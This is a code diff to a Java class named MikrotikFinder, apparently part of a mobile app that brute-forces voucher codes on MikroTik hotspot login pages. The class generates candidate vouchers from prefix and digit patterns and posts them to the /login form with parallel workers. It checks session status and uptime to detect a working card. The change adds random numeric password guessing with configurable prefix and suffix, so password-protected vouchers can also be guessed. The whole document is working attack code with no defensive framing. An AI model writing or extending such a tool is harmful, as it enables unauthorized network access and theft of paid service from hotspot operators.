@@ -43,6 +43,9 @@ public class MikrotikFinder {
     private final AtomicLong totalAttempts = new AtomicLong(0);
     private final String allowedDigits;
     private final int guessMode;
+    private final boolean pwEnabled;
+    private final String pwPrefix, pwSuffix;
+    private final int pwDigits;
     private final java.util.concurrent.atomic.AtomicLong counter = new java.util.concurrent.atomic.AtomicLong(0);
     private final java.util.concurrent.atomic.AtomicInteger recentErrors = new java.util.concurrent.atomic.AtomicInteger(0);
     private final java.util.List<String> candidates = java.util.Collections.synchronizedList(new java.util.ArrayList<>());
@@ -61,7 +64,8 @@ public class MikrotikFinder {
                           String prefix, String middle, String suffix,
                           int varDigits, int maxAttempts, int waitMs, int parallel,
                           boolean relax, GuessDatabase db,
-                          String allowedDigits, int guessMode) {
+                          String allowedDigits, int guessMode,
+                          boolean pwEnabled, String pwPrefix, String pwSuffix, int pwDigits) {
         this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
         String calcBase;
         try {
@@ -87,6 +91,10 @@ public class MikrotikFinder {
         this.db = db;
         this.allowedDigits = (allowedDigits == null || allowedDigits.isEmpty()) ? "0123456789" : allowedDigits;
         this.guessMode = guessMode;
+        this.pwEnabled = pwEnabled;
+        this.pwPrefix = pwPrefix == null ? "" : pwPrefix;
+        this.pwSuffix = pwSuffix == null ? "" : pwSuffix;
+        this.pwDigits = Math.max(0, Math.min(9, pwDigits));
         // 🧠 منطق عدم التكرار الذكي
         try {
             String savedPrefix = db.getConfig("prefix");
@@ -173,7 +181,8 @@ public class MikrotikFinder {
                 if (voucher == null) break;
                 currentVoucher = voucher;
                 emitProgress("");
-                if (tryLogin(voucher, session)) {
+                String password = pwEnabled ? generatePassword() : "";
+                if (tryLogin(voucher, password, session)) {
                     foundVoucher = voucher;
                     final String v = voucher;
                     if (listener != null) uiHandler.post(() -> listener.onCardFound(v, lastStatusJson));
@@ -200,15 +209,15 @@ public class MikrotikFinder {
         }
     }
 
-    private boolean tryLogin(String voucher, WorkerSession session) {
+    private boolean tryLogin(String voucher, String password, WorkerSession session) {
         session.setCookie("username", voucher);
-        session.setCookie("password", "");
+        session.setCookie("password", password == null ? "" : password);
 
         String beforeJson = httpGet(base + STATUS_PATH, session, 5000);
         long beforeUptime = parseUptime(getStr(beforeJson, "uptime"));
         boolean beforeActive = statusActive(beforeJson);
 
-        String body = buildFormBody(formTemplate, voucher);
+        String body = buildFormBody(formTemplate, voucher, password);
         String postResp = httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
         if (postResp == null) {
@@ -378,6 +387,13 @@ public class MikrotikFinder {
         } catch (Exception e) { return null; }
     }
 
+    private String generatePassword() {
+        if (pwDigits <= 0) return "";
+        int max = (int) Math.pow(10, pwDigits) - 1;
+        int num = (int)(Math.random() * (max + 1));
+        return pwPrefix + pad(num, pwDigits) + pwSuffix;
+    }
+
     private String generateVoucher() {
         int base = allowedDigits.length();
         long total = 1;
@@ -437,12 +453,14 @@ public class MikrotikFinder {
         return prefix + part1 + middle + part2 + suffix;
     }
 
-    private String buildFormBody(Map<String, String> fields, String voucher) {
+    private String buildFormBody(Map<String, String> fields, String voucher, String password) {
         StringBuilder sb = new StringBuilder();
         for (Map.Entry<String, String> e : fields.entrySet()) {
             if (sb.length() > 0) sb.append('&');
             String key = e.getKey();
-            String val = "username".equals(key) ? voucher : e.getValue();
+            String val = e.getValue();
+            if ("username".equals(key)) val = voucher;
+            else if ("password".equals(key)) val = password == null ? "" : password;
             sb.append(enc(key)).append('=').append(enc(val == null ? "" : val));
         }
         return sb.toString();
